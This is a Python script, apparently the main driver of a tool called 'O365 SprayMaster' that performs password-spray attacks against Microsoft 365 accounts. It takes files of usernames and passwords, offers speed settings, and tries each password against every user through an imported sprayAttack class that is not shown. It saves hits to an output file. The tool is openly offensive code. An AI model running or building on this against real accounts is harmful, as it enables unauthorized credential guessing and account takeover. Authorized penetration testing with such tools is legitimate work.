#!/usr/bin/enc python3
"""Author = Vishal Raj
   Version = 1.0
   Year = 2024
   Linkedin = www.linkedin.com/in/vishal-raj007
"""
import logging
import argparse
import sys
from SprayO365 import *

class TextColor:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  MAGENTA = '\033[95m'
  CYAN = '\033[96m'
  RESET = '\033[0m'  # Reset to default color

def get_args():
  parser = argparse.ArgumentParser(description="[O365 SprayMaster] O365 Password Spray Atack Tool")
  parser.add_argument("-u", "--userList", type=str, metavar="username_list", required=True,
                      help="File name which contain User List.")
  parser.add_argument("-p", "--passList", type=str, metavar="passwords_list", required=True,
                      help="File name which contain List of Passwords.")
  parser.add_argument("-t", "--threshold", choices=['slow','medium','fast','veryfast'],
                    default='medium', help="Set the speed threshold for the attack (slow, medium, fast). Default is fast.")
  parser.add_argument("-o", "--output", type=str, metavar="output_filename",
                      help="File name which contain User List.")
  args = parser.parse_args()
  return args

def main():
  args = get_args()
  userList_path = args.userList
  passList_path = args.passList
  threshold = args.threshold
  delay = 0
  try:
    with open(userList_path,'r') as file:
      users = file.read().splitlines()
    with open(passList_path, 'r') as file:
      passwords = file.read().splitlines()
  except FileNotFoundError as e:
    print(f"File {e.filename} doesnot exist.")
    sys.exit(-1)

  if args.output:
    outputFile = args.output
    #creating the object of class sprayAttack
    attack = sprayAttack(threshold,output=outputFile)
  else: attack = sprayAttack(threshold)
  
  # Print the banner
  attack.banner()
  # calling passwordSpray method to perform password spray attack on each username and password
  for password in passwords:
    for user in users:
      attack.passwordSpray(user,password)
  
  if args.output:
    with open(outputFile,'a')as file:
      for result in attack.full_result:
          file.write(result + "\n")  
    print(TextColor.GREEN + f"Results have been written to {outputFile}." + TextColor.RESET)

if __name__=='__main__':
  main()